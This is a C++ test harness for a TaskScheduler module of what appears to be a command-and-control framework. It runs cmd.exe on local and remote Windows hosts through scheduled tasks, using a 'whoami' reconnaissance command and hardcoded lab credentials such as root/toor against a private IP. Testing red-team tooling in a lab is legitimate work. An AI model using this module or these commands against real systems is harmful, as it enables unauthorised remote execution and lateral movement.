#include "../TaskScheduler.hpp"

#include <memory>
#include <vector>
#include <iostream>

int main()
{
    {
        std::unique_ptr<TaskScheduler> module = std::make_unique<TaskScheduler>();
        std::vector<std::string> cmd = {"taskScheduler", "-c", "cmd.exe", "-a", "\"/c", "whoami\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<TaskScheduler> module = std::make_unique<TaskScheduler>();
        std::vector<std::string> cmd = {"taskScheduler", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\vuln\\Desktop\\ts_test.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<TaskScheduler> module = std::make_unique<TaskScheduler>();
        std::vector<std::string> cmd = {"taskScheduler", "-u", "DESKTOP-1CNTUCT\\root", "-p", "root", "-s", "192.168.122.59", "-c", "cmd.exe", "-a", "/c echo ran > C:\\Users\\root\\Desktop\\ts_test2.txt"};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<TaskScheduler> module = std::make_unique<TaskScheduler>();
        std::vector<std::string> cmd = {"taskScheduler", "-u", ".\\root", "-p", "root", "-s", "192.168.122.59", "-c", "cmd.exe", "-a", "/c echo ran > C:\\Users\\root\\Desktop\\ts_test2.txt"};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<TaskScheduler> module = std::make_unique<TaskScheduler>();
        std::vector<std::string> cmd = {"taskScheduler", "-u", "root", "-p", "root", "-s", "192.168.122.59", "-c", "cmd.exe", "-a", "/c echo ran > C:\\Users\\root\\Desktop\\ts_test2.txt"};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<TaskScheduler> module = std::make_unique<TaskScheduler>();
        std::vector<std::string> cmd = {"taskScheduler", "-u", "root", "-p", "toor", "-s", "192.168.122.59", "-c", "cmd.exe", "-a", "/c echo ran > C:\\Users\\root\\Desktop\\ts_test.txt"};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }

    std::cout << "Finish" << std::endl;

    return 0;
}

